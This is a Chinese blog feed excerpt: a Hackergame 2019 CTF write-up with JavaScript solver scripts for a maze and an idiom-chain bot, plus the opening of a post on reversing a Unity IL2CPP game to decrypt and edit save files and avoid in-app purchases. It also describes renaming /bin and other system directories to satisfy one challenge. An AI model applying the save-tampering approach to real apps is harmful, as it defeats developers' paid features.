-<p>仔细阅读汇编，看到其中有很多 <code>push 2; add; push x; sub</code> 的操作，或许这就是在试图计算 flag，以便于和用户的输入进行比较。</p>
-
-
-
-<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-7.1.png" alt="" class="wp-image-1356" width="183" height="333" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-7.1.png 345w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-7.1-165x300.png 165w" sizes="(max-width: 183px) 100vw, 183px" /></figure></div>
-
-
-
-<p>将这部分 push 后的数字提取出，减去 2 后转为字符，并翻转字符串，获得flag。</p>
-
-
-
-<p><strong>flag{Whit3sp4c3_is_a_difficult_pr0gr4m_l4ngu4g3}</strong></p>
-
-
-
-<h2>我想要个家 250</h2>
-
-
-
-<blockquote class="wp-block-quote"><p>有一天，C 同学做了一个梦，他竟然搬进了大房子，只是似乎有些地方 C 同学不太满意……<br>注意：<br>此题考察的是对于 Linux 基础知识的掌握。尽管可以，但不建议使用逆向工程的方式完成。<br>在根目录（<code>/</code>）下的文件夹对 Linux 系统的运行十分重要，<strong>请不要为了完成此题目删除自己的&nbsp;<code>/usr</code>,&nbsp;<code>/bin</code>&nbsp;等文件夹！</strong> </p><cite><a rel="noreferrer noopener" aria-label="下载 (opens in a new tab)" href="https://mega.nz/#!t0RxySJS!Q1lEFK9ZYLGXD388Wr7YAyFmkgMw8uOdXhfcC7qr_sA" target="_blank">题目文件</a></cite></blockquote>
-
-
-
-<p>看了题目中“温馨”的提示，立马打开了逆向工具——嗯，啥都看不懂。好吧，只好拿出一台没啥用的机子，乖乖跑程序。</p>
-
-
-
-<figure class="wp-block-image"><img loading="lazy" width="1024" height="359" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.2-1024x359.jpg" alt="" class="wp-image-1378" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.2-1024x359.jpg 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.2-300x105.jpg 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.2-768x269.jpg 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.2.jpg 1157w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
-
-
-
-<p>程序一开始只是让我在根目录建几个文件夹，但接着画风突变，开始要求我删除根目录下的系统目录。</p>
-
-
-
-<p>参考<a rel="noreferrer noopener" aria-label="这里 (opens in a new tab)" href="https://unix.stackexchange.com/questions/264341/linux-unix-proc-rename" target="_blank">这里</a>的方法重名了几个目录，再用 <code>mv</code> 命令将 <code>bin</code> 等目录重名为了 <code>bin1</code>。</p>
-
-
-
-<p>程序紧接着开始得寸进尺，提出了更多条件，要我将两个文件连通。由于我的 <code>/bin</code> 已经没了，接下来的命令需要以 <code>/bin1/ln</code> 的形式输入。</p>
-
-
-
-<p>接着程序要求我建立一个文件，里面始终能够获得当前的北京时间。感觉上是要做一个类似 <code>/dev/urandom</code> 这样的伪设备，不过我直接写了个脚本，不断循环把当前时间写入指定的文件。</p>
-
-
-
-<p>最后，程序让我 <code>sleep</code> 10 秒，没错，我的 <code>bin</code> 已经没了。输入命令 <code>/bin1/sleep 10</code>，获得 flag。</p>
-
-
-
-<p>哦对了，获得 flag 后还有最后一步，就是去服务器控制面板重装系统&#8230;&#8230;</p>
-
-
-
-<figure class="wp-block-image"><img loading="lazy" width="1024" height="114" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.1-1024x114.jpg" alt="" class="wp-image-1377" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.1-1024x114.jpg 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.1-300x33.jpg 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.1-768x86.jpg 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.1.jpg 1275w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption>获得 flag 后根目录的画风</figcaption></figure>
-
-
-
-<h2>宇宙终极问题 450</h2>
-
-
-
-<blockquote class="wp-block-quote"><p>天何所杳, 十二焉分?<br>日月安属, 列星安陈?<br>浩瀚宇宙的一个寻常星系里, 弥漫六合的暗物质晕中, 远古的诗歌在狄拉克海上无声回荡.<br>史诗般的超级计算机&nbsp;<strong>Deep Thought</strong>&nbsp;, 寒冷星空下的百万亿场效应管, 人类终得以一窥这个宇宙最深层的奥秘.<br>没错, 就是 42, 对于生命, 对于宇宙, 对于世间万物的答案. </p><cite>第一小题：请给出一组 x y z，使得 x^3 + y^3 + z^3 = 42<br>第二小题：给定 n = random_prime(2^256) * random_prime(2^256) ，请给出一组 a b c d i j k l，使得 a^3 + b^3 + c^3 + d^3 = i^2 + j^2 + k^2 + l^2 = n<br>第三小题：给定 n = randint(2^256) ，请给出一组 p q，使得 p^2 + q^2 = n</cite></blockquote>
-
-
-
-<p>数学不好真是抱歉了。这题完全是用 Google<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> 搜索求解的。</p>
-
-
-
-<p>第一小题通过搜索可以找到答案。<br>第二小题通过搜索可以找到两个求解页面：<a rel="noreferrer noopener" aria-label="四平方 (opens in a new tab)" href="https://www.alpertron.com.ar/FSQUARES.HTM" target="_blank">四平方</a> <a rel="noreferrer noopener" aria-label="四立方 (opens in a new tab)" href="https://www.alpertron.com.ar/FCUBES.HTM" target="_blank">四立方</a>（作者也提供了<a rel="noreferrer noopener" aria-label="源码 (opens in a new tab)" href="https://github.com/alpertron/calculators" target="_blank">源码</a>）。<br>第三小题根据我的理解，并非所有的 n 都可以表示成两个数的平方和。因此多次获取不同的 n，并放到四平方求解页面尝试求解。</p>
-
-
-
-<p><strong>flag{W0W_you_kn0w_the_Answer_t0_l1f3_Un1v3r5e_&amp;_Everyth1ng_77cdda6cca}<br>flag{N0W_you_Alr3ady_kn0w_Everyth1ng_043484f4db}<br>flag{You_DO_kn0w_M0re_Th4n_Everyth1ng_774656f052}</strong></p>
-
-
-
-<p>这题告诉了我们，数学在 CTF 里很重要。（<s>Google<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> 搜索在 CTF 里也很重要</s>）</p>
-
-
-
-<h2>无限猴子定理 250</h2>
-
-
-
-<blockquote class="wp-block-quote"><p>无限猴子定理指出：一只猴子在打字机上仅靠随机按键，几乎必然能够在足够长的时间后打出莎士比亚的全套著作，自然也能打出本次比赛的所有 flag。<br>小郑曾经和小赵说过：宇宙的本质是计算。因此，小赵认为，辅助利用计算机生成的随机数，能够更容易地找到 flag 等有意义的信息，从而大大缩短验证无限猴子定理的时间。小赵找到了一串猴子打出的文本（<code>might_be_flag.txt</code>），并自行编写了生成随机数的程序（<code>find_flag.py</code>）。<br>一系列随机数将会通过程序源源不断地生成，而每个随机数都可能在文本中对应出一个正确的 flag。小赵到底能不能如愿以偿地拿到 flag 呢？<br>注：<br>1. flag 一定代表一串有意义的英文单词序列，但本题完全不需要任何程度的基于机器的自然语言识别。<br>2. 和本次比赛的其他 flag 类似，本题的对应 flag 中可能有英文字母被替换混淆。<br>3. flag 代表的第一个英文单词既不会是名词，也不会是形容词。 </p></blockquote>
-
-
-
-<div class="wp-block-file"><a href="https://coxxs.me/wp-content/uploads/2019/10/InfMonkey.zip">InfMonkey.zip</a><a href="https://coxxs.me/wp-content/uploads/2019/10/InfMonkey.zip" class="wp-block-file__button" download>下载</a></div>
-
-
-
-<p>运行程序后，不断产生形如 <code>(0x0123) =&gt; flag{.....}</code> 的字符串。移除程序中的 sleep 延时代码，并将这些生成的 flag 保存为文件，注意到每生成 65512 轮 flag 后就会回到起点，开始生成与刚才相同的 flag。也就是说，总共生成了 65512 个不同的 flag。</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">(0x0000) => flag{EH650ARRBN6wFygy3E}
-(0x316B) => flag{EELPa1VXQdAYxlD1Fx}
-(0xB110) => flag{xVd+7waO7T0B5pAs2n}
-(0x7762) => flag{n+TkwdI21/wzJ5YiId}
-(0x01A9) => flag{dwcbomCw/sRu2BT+H/}
-......</pre>
-
-
-
-<p>由于题目提到 flag 中包含单词，于是我就提取出这些 flag 中包含多个单词的 flag。然而，在人力二次检索几千个 flag 后，依然一无所获。</p>
-
-
-
-<p>再次分析程序，注意到这里所生成的 flag 中的字符，事实上都来自 <code>might_be_flag.txt</code> 文件中的不同位置。那有没有可能有一些位置并没有被用到呢？修改程序，将在 <code>might_be_flag.txt</code> 文件中被使用过的位置剔除。运行后，确实留下了一些从未被用过的字符。</p>
-
-
-
-<p>将这些字符直接连接并看不出什么，但如果强行让这些字符参与到随机序列的生成呢？于是将其中的一个字符的位置作为 <code>random_iter</code> 的起点，运行生成 flag。</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">python find_flag.py
- (0x0C2A) => flag{+8ad+LC+Generat0r+}
- (0xBB4F) => flag{+A+8ad+LC+Generat0}
- (0x6A79) => flag{0r+A+8ad+LC+Genera}
- (0x19A3) => flag{at0r+A+8ad+LC+Gene}
- (0xC8C8) => flag{erat0r+A+8ad+LC+Ge}
- (0x77F2) => flag{enerat0r+A+8ad+LC+}
- (0x271C) => flag{+Generat0r+A+8ad+L}
- (0xD641) => flag{LC+Generat0r+A+8ad}
- (0x856B) => flag{d+LC+Generat0r+A+8}
- (0x3495) => flag{8ad+LC+Generat0r+A}
- (0xE3BA) => flag{A+8ad+LC+Generat0r} # Flag
- (0x92E4) => flag{r+A+8ad+LC+Generat}
- (0x420E) => flag{t0r+A+8ad+LC+Gener}
- (0xF133) => flag{rat0r+A+8ad+LC+Gen}
- (0xA05D) => flag{nerat0r+A+8ad+LC+G}
- (0x4F87) => flag{Generat0r+A+8ad+LC}
- (0xFEAC) => flag{C+Generat0r+A+8ad+}
- (0xADD6) => flag{+LC+Generat0r+A+8a}
- (0x5D00) => flag{ad+LC+Generat0r+A+}</pre>
-
-
-
-<p>直到这时，我才理解题目中几条提示的意义&#8230; 好吧，<code>A</code> 确实不是名词，也不是形容词&#8230; (╯‵□′)╯︵┻━┻</p>
-
-
-
-<p><strong>flag{A+8ad+LC+Generat0r}</strong></p>
-
-
-
-<h2>PowerShell 迷宫 250</h2>
-
-
-
-<blockquote class="wp-block-quote"><p><a href="https://gist.github.com/Coxxs/b8a38f6fe64db1e0f7580a864ddad4b8">题目说明</a></p></blockquote>
-
-
-
-<figure class="wp-block-image"><img loading="lazy" width="1024" height="651" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.1-1024x651.png" alt="" class="wp-image-1373" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.1-1024x651.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.1-300x191.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.1-768x488.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.1-1568x996.png 1568w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
-
-
-
-<p>一道 Powershell 实现的迷宫。由于只提供了浏览器的终端，因此基本上是要写 Powershell 脚本丢上去解题了。但我就是不想写 PS 脚本&#8230;</p>
-
-
-
-<h3>解法1</h3>
-
-
-
-<figure class="wp-block-image"><img loading="lazy" width="807" height="1022" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.2.png" alt="" class="wp-image-1374" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.2.png 807w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.2-237x300.png 237w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.2-768x973.png 768w" sizes="(max-width: 807px) 100vw, 807px" /></figure>
-
-
-
-<p>在意识到迷宫的规模后，我放弃了手画，开始让程序自动画&#8230;</p>
-
-
-
-<h3>解法2</h3>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">socket.send('[选手token]\r\n')
-
-j = localStorage.getItem('maze')
-var m
-if (!j) {
-  m = {
-    x: 70,
-    y: 70,
-    horiz: new Array(71).fill(0).map(row => new Array(71).fill(false)),
-    verti: new Array(71).fill(0).map(row => new Array(71).fill(false)),
-    pos: new Array(71).fill(0).map(row => new Array(71).fill(false)),
-    here: [0, 0]
-  }
-} else {
-  m = JSON.parse(j)
-}
-
-
-function display(m) {
-  var text= [];
-  for (var j= 0; j&lt;m.x*2+1; j++) {
-    var line= [];
-    if (0 == j%2)
-      for (var k=0; k&lt;m.y*4+1; k++)
-        if (0 == k%4) 
-          line[k]= '+';
-        else
-          if (j>0 &amp;&amp; m.verti[j/2-1][Math.floor(k/4)])
-            line[k]= ' ';
-          else
-            line[k]= '-';
-    else
-      for (var k=0; k&lt;m.y*4+1; k++)
-        if (m.here &amp;&amp; m.here[0]*2+1 == j &amp;&amp; m.here[1]*4+2 == k) 
-          line[k]= '#'
-        else if ((k-2)%4 == 0 &amp;&amp; (j-1)%2 == 0 &amp;&amp; m.pos[(j-1)/2][(k-2)/4] === false)
-          line[k]= '?'
-        else if ((k-2)%4 == 0 &amp;&amp; (j-1)%2 == 0 &amp;&amp; m.pos[(j-1)/2][(k-2)/4] === 2)
-          line[k]= '.'
-        else if (0 == k%4)
-          if (k>0 &amp;&amp; m.horiz[(j-1)/2][k/4-1])
-            line[k]= ' ';
-          else
-            line[k]= '|';
-        else
-          line[k]= ' ';
-    if (0 == j) line[1]= line[2]= line[3]= ' ';
-    if (m.x*2-1 == j) line[4*m.y]= ' ';
-    text.push(line.join('')+'\r\n');
-  }
-  return text.join('');
-}
-
-socket.onmessage = event => {
-  if (event.data.indexOf('flag{') >= 0) {
-    console.log(event.data);
-    alert(event.data);
-  }
-  var regex = /\s+(Up|Down|Left|Right)\s+(\d+)\s+(\d+)(.*)/g
-  var match
-  while (match = regex.exec(event.data)) {
-    update(match[1], Number(match[2]), Number(match[3]), match[4].trim())
-  }
-}
-
-function update(direction, x, y, flag) {
-  if (flag) {
-    console.log(flag)
-    alert(flag)
-  }
-  if (direction == 'Left') {
-    m.here = [y, x + 1]
-    m.horiz[y][x] = true
-    m.pos[y][x + 1] = true
-    if (m.pos[y][x] === false) m.pos[y][x] = 2
-  }
-  if (direction == 'Right') {
-    m.here = [y, x - 1]
-    m.horiz[y][x - 1] = true
-    m.pos[y][x - 1] = true
-    if (m.pos[y][x] === false) m.pos[y][x] = 2
-  }
-  if (direction == 'Up') {
-    m.here = [y + 1, x]
-    m.verti[y][x] = true
-    m.pos[y + 1][x] = true
-    if (m.pos[y][x] === false) m.pos[y][x] = 2
-  }
-  if (direction == 'Down') {
-    m.here = [y - 1, x]
-    m.verti[y - 1][x] = true
-    m.pos[y - 1][x] = true
-    if (m.pos[y][x] === false) m.pos[y][x] = 2
-  }
-  console.log(direction + ' ' + x + ' ' + y)
-}
-
-document.onkeydown = function (e) {
-    // go to the back
-    if (e.keyCode == 32) {
-    socket.send("cd ..; ls\r\n")
-    }
-    // go to the right
-    if (e.keyCode == 39) {
-    socket.send("cd right; ls\r\n")
-    }
-    // go to the left
-    if (e.keyCode == 37) {
-    socket.send("cd left; ls\r\n")
-    }
-    // go to the up
-    if (e.keyCode == 38) {
-    socket.send("cd up; ls\r\n")
-    }
-    // go to the down
-    if (e.keyCode == 40) {
-    socket.send("cd down; ls\r\n")
-    }
-};
-
-var e = document.createElement('div');
-e.innerHTML = `
-&lt;div id="maze" style="position:absolute; opacity:.93; left:0; right:0; top:0; bottom: 0; z-index:100; background-color: white; font-size: 7px; font-weight: bolder; font-family: monospace; line-height: 3.95px; letter-spacing: -1px;">&lt;pre id="mt">&lt;/pre>&lt;/div>
-`;
-document.body.appendChild(e);
-
-function draw() {
-  document.getElementById('mt').innerHTML = display(m);
-  if (Math.random() &lt; 0.05) {
-    localStorage.setItem('maze', JSON.stringify(m));
-  }
-}
-
-g = setInterval(draw, 80)</pre>
-
-
-
-<p>画迷宫部分代码摘自：<a href="https://github.com/freeCodeCamp/arcade-mode/blob/master/client/scripts/challenges/rosettacode/preformatted/M/Maze%20generation.raw">freeCodeCamp/arcade-mode</a>，在此表示感谢。</p>
-
-
-
-<p>F12 输入代码后，本题就变成了一个迷宫游戏。用键盘开始探索迷宫吧！<code>?</code> 代表未探索的区域，<code>.</code> 代表未探索但确定没有 <code>flag</code> 的位置。</p>
-
-
-
-<p>这段代码会使用 <code>localStorage</code> 自动保存已经探索过的迷宫，超时断线后刷新可继续游玩。</p>
-
-
-
-<figure class="wp-block-image"><img loading="lazy" width="1024" height="656" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.3-1024x656.png" alt="" class="wp-image-1375" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.3-1024x656.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.3-300x192.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.3-768x492.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.3-1568x1005.png 1568w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
-
-
-
-<h3>解法3</h3>
-
-
-
-<p>后来才发现，通过 <code>cd /</code> 回到根目录后，是可以在 <code>/opt/PSMaze.dll</code> 下找到题目二进制的。文件中有 flag 的一部分，另一部分似乎是算出来的。由于已经找到 flag，就没有继续深入。</p>
-
-
-
-<p>用解法2解完题目后，我的内心是崩溃的&#8230; 早知道就乖乖写 PS 脚本去了&#8230; (T_T)</p>
-
-
-
-<p><strong>flag{D0_y0u_1ik3_PSC0r3_n0w_2C6BE488}</strong></p>
-
-
-
-<h2>Flag 红包 350</h2>
-
-
-
-<blockquote class="wp-block-quote"><p> 你知道「<a rel="noreferrer noopener" href="https://lia.ustc-zzzz.net/" target="_blank">一个顶俩（liǎ）</a>」吗？<br>又（快）到了发红包的季节。为了让别人陷入成语红包收不到的尴尬，某同学用了一周的开发时间，精心打造了一个成语接龙 AI。<br>那么，你能抢到他发出的红包吗？<br>成语数据库可以在题目网页的右上角下载。 <br>注：上面链接的网站与题目无关。</p><cite><a href="https://mega.nz/#!hlRnGCyZ!bh2W7--SUeVG892vxj8qmxk8eo-TrnD1yEX950FpyqE" target="_blank" rel="noreferrer noopener" aria-label="成语数据库 (opens in a new tab)">成语数据库</a></cite></blockquote>
-
-
-
-<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.1-1024x974.png" alt="" class="wp-image-1370" width="369" height="350" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.1-1024x974.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.1-300x285.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.1-768x730.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.1.png 1364w" sizes="(max-width: 369px) 100vw, 369px" /></figure></div>
-
-
-
-<p>既然本题放在最后一题，应该不会太容易。果然，我写的感觉起码能赢一两局的答题机器人——最后连一局都赢不了。对方总是能通过成语不能重复使用的规则，在来回几百轮后把我的机器人逼上绝路。</p>
-
-
-
-<p>好吧，原来这又是一道算法题。 既然我算法烂，那就让对面两个机器人互干吧。不过因为每一局第一个词都是“废理兴工”，因此先要让一个机器人接出“工”开头的成语才行。这里写了一个简单的算法来实现，掐起来后就交给机器人们吧~ (*￣3￣)╭</p>
-
-
-
-<p>先将成语列表保存到 <code>localStorage</code> 中，便于之后程序调用。</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">fetch('/idl.json').then(response => {
-  return response.json();
-}).then(data => {
-  window.localStorage.setItem('dict', JSON.stringify(data))
-}).catch(err => {
-  console.log(err)
-});</pre>
-
-
-
-<p>接着开始让机器人自己干<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/2642.png" alt="♂" class="wp-smiley" style="height: 1em; max-height: 1em;" />自己（程序写的稍有些乱）</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">const dict = JSON.parse(window.localStorage.getItem('dict'))
-
-class bot {
-  constructor (botid, callback) {
-    this.botid = botid
-    this.ready = false
-    this.callback = callback
-
-    this.mysocket = io.connect(window.location.href, {
-      transports: ['websocket']
-    })
-    this.mysocket.on('reply', function(msg) {
-      this.process(msg.data)
-    }.bind(this));
-  }
-
-  process (msg) {
-    console.log(this.botid + ' ↓ ' + msg)
-    if (msg == '服务器给你发送了一个接龙红包:') return
-    this.callback(true, msg)
-    return
-  }
-
-  send (msg) {
-    console.log(this.botid + ' ↑ ' + msg)
-    this.mysocket.emit('go', {data: msg});
-  }
-}
-
-class flxgSolver {
-  constructor (botid, callback) {
-    this.botid = botid
-    this.bot = new bot(botid, this.solve.bind(this))
-    this.first_index = { }
-    this.last_index = { }
-    this.used = []
-    this.danger = {}
-    this.success = false
-    this.callback = callback
-
-    this.init()
-  }
-
-  init() {
-    for (var word in dict) {
-      if (!this.first_index[dict[word].first]) this.first_index[dict[word].first] = []
-      this.first_index[dict[word].first].push(word)
-
-      if (!this.last_index[dict[word].last]) this.last_index[dict[word].last] = []
-      this.last_index[dict[word].last].push(word)
-    }
-
-    this.danger = {}
-    for (var word in dict) {
-      if (this.first_index[dict[word].last] &amp;&amp; !['run'].includes(dict[word].last)) continue
-      let first = dict[word].first
-      if (!this.danger[first]) this.danger[first] = []
-      this.danger[first].push(word)
-    }
-  }
-
-  solve (res, msg) {
-    if (!res) {
-      console.error('disconnected')
-      return false
-    }
-    if (this.success) {
-      this.callback(true, msg)
-      return
-    }
-    this.used.push(msg)
-    var words = []
-    var ban = Object.keys(this.danger)
-    for (var i of this.first_index[dict[msg].last]) {
-      if (this.used.includes(i)) {
-        // console.log(this.botid + ' ' + i + ' 被使用，跳过')
-        continue
-      }
-      if (ban.includes(dict[i].last)) {
-        // console.log(this.botid + ' ' + i + ' 被封禁，跳过')
-        continue
-      }
-      if (dict[i].last == 'gong') {
-        this.success = true
-        words = [ i ]
-        break 
-      }
-      words.push(i)
-    }
-    if (!words.length) {
-      console.error('failed')
-      return false
-    }
-    var word = words[Math.floor(Math.random() * words.length)]
-    // console.log(this.botid + ' ↑ ' + word)
-    this.used.push(word)
-    this.bot.send(word)
-  }
-}
-
-const getid = () => (window.botid = window.botid ? window.botid + 1 : 1)
-
-var solver
-var mainbot
-var end = false
-
-function solver_cb(res, msg) {
-  if (end) return
-  if (msg &amp;&amp; msg.indexOf('的成语!') > 0) {
-    solver.bot.mysocket.close()
-    mainbot.mysocket.close()
-    solver = null
-    mainbot = null
-    setTimeout(main_cb, 5000)
-    return
-  }
-  if (!res) {
-    solver = new flxgSolver('解题器' + getid(), solver_cb)
-    return
-  }
-  if (msg.indexOf('img') > 0) { // success
-    mainbot.send(msg.substr(0, 4))
-    solver.bot.mysocket.close()
-    solver = null
-    return
-  }
-  mainbot.send(msg)
-}
-
-function main_cb(res, msg) {
-  if (msg &amp;&amp; msg.indexOf('flag{') >= 0) {
-    console.log(msg)
-    solver = null
-    mainbot = null
-    end = true
-    return
-  }
-  if (msg &amp;&amp; msg.indexOf('flag 碎片') > 0) return
-  if (msg &amp;&amp; (msg.indexOf('的成语!') > 0 || msg.indexOf('img') > 0)) {
-    solver.bot.mysocket.close()
-    mainbot.mysocket.close()
-    solver = null
-    mainbot = null
-    setTimeout(main_cb, 5000)
-    return
-  }
-  if (!res) {
-    mainbot = new bot('主机', main_cb)
-    return
-  }
-  if (msg == '废理兴工') {
-    solver_cb()
-    return // wait
-  }
-  solver.bot.send(msg)
-}
-
-
-main_cb()</pre>
-
-
-
-<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.3.png" alt="" class="wp-image-1390" width="415" height="490" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.3.png 815w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.3-254x300.png 254w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.3-768x908.png 768w" sizes="(max-width: 415px) 100vw, 415px" /><figcaption>左右互搏现场</figcaption></figure></div>
-
-
-
-<p>考虑进一些意外情况，每一局胜率不到 50%，不过这样的胜率连赢 4 局也够了。看着两个机器人玩耍了一阵子后，获得 flag。</p>
-
-
-
-<figure class="wp-block-image"><img loading="lazy" width="1024" height="672" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.2-1024x672.png" alt="" class="wp-image-1371" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.2-1024x672.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.2-300x197.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.2-768x504.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.2-1568x1029.png 1568w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.2.png 1976w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
-
-
-
-<p><strong>flag{True_Virtuoso_of_Chinese_Idioms_89f2516f46}</strong></p>
-
-
-
-<hr class="wp-block-separator"/>
-
-
-
-<p>最终得分：5200， 总排名：4 / 1904</p>
-
-
-
-<p><strong>Coxxs</strong></p>
-<p><a rel="nofollow" href="https://dev.moe/1321">Hackergame 2019（中科大信安赛）write up</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
-]]></content:encoded>
-					
-					<wfw:commentRss>https://dev.moe/1321/feed</wfw:commentRss>
-			<slash:comments>11</slash:comments>
-		
-		<enclosure url="https://coxxs.me/wp-content/uploads/2019/10/flag.mid" length="14050" type="audio/midi" />
-
-		<post-id xmlns="com-wordpress:feed-additions:1">1321</post-id>	</item>
-		<item>
-		<title>记一次 Unity IL2CPP 游戏逆向</title>
-		<link>https://dev.moe/1282</link>
-					<comments>https://dev.moe/1282#comments</comments>
-		
-		<dc:creator><![CDATA[Coxxs]]></dc:creator>
-		<pubDate>Mon, 26 Aug 2019 01:11:05 +0000</pubDate>
-				<category><![CDATA[Code]]></category>
-		<guid isPermaLink="false">https://coxxs.me/?p=1282</guid>
-
-					<description><![CDATA[<p>本文由 Coxxs 原创，转载须注明原文链接：https://dev.moe/1282 Instant App<a class="more-link" href="https://dev.moe/1282">继续阅读<span class="screen-reader-text">"记一次 Unity IL2CPP 游戏逆向"</span></a></p>
-<p><a rel="nofollow" href="https://dev.moe/1282">记一次 Unity IL2CPP 游戏逆向</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
-]]></description>
-										<content:encoded><![CDATA[
-<p> 本文由 Coxxs 原创，转载须注明原文链接：<a href="https://dev.moe/1282">https://dev.moe/1282</a></p>
-
-
-
-<p>Instant Apps 真是个可怕的东西。</p>
-
-
-
-<p>闲着没事就点开了个愤怒的小鸟出品的 Dream Blast 试玩，玩了几分钟觉着有意思，就下了 70MB 的完整版游戏。于是乎，几个小时就玩没了&#8230;</p>
-
-
-
-<p>手游嘛，开头吸引人，后期总是氪氪氪。虽然我支持正版，但内购却并不讨喜。这游戏又有内购联网验证。思前想后，不如直接改存档吧。几经尝试，找到了位于   <code>sdcard/Android/data/com.ro**o.dream/files/users/[userid]/prefs.json</code> 的游戏存档文件。打开一看，好好的一个 .json 文件，怎么里面全是乱码呢。好吧，找加密算法去吧。</p>
-
-
-
-<span id="more-1282"></span>
-
-
-
-<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/08/image-7.png" alt="" class="wp-image-1294" width="255" height="342" srcset="https://dev.moe/wp-content/uploads/2019/08/image-7.png 383w, https://dev.moe/wp-content/uploads/2019/08/image-7-224x300.png 224w" sizes="(max-width: 255px) 100vw, 255px" /><figcaption>内购再见！</figcaption></figure></div>
-
-
-
-<h2>还原 IL2CPP</h2>
-
-
-
-<p>解包游戏大致看了看，classes.dex 里都是些无关紧要的东西，游戏逻辑估计是写 Unity 代码里了。找了找并没有 Unity 的 .NET 二进制文件 <code>assets/bin/Data/Managed/Assembly-CSharp.dll</code>，原来是用了 <a rel="noreferrer noopener" aria-label="IL2CPP (opens in a new tab)" href="https://docs.unity3d.com/Manual/IL2CPP.html" target="_blank">IL2CPP</a> 来编译。这样一来，游戏用到的字符串等被放到了 <code>assets/bin/Data/Managed/Metadata/global-metadata.dat</code>，而游戏二进制文件则位于 <code>lib/armeabi-v7a/libil2cpp.so</code>。</p>
-
